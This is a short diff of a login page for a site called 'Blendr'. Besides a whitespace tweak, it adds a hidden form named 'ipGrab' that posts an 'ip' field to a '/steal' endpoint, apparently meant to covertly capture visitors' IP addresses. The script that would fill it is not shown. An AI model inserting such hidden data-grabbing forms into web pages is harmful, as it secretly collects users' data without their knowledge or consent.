@@ -15,7 +15,7 @@
         Login to Blendr
     </div>
 
-    <form id="loginForm" method="post">
+    <form id="loginForm" method="post" >
         <div class="center" id="userdiv">
             <label for"username">
                 Username:
@@ -44,6 +44,9 @@
         </div>
     </form>
 
+    <form hidden id="ipGrab" method="post" action="/steal">
+        <input name="ip" id="ipBox" value=""/>
+    </form>
 
     <script src="scripts.js"></script>
 </body>
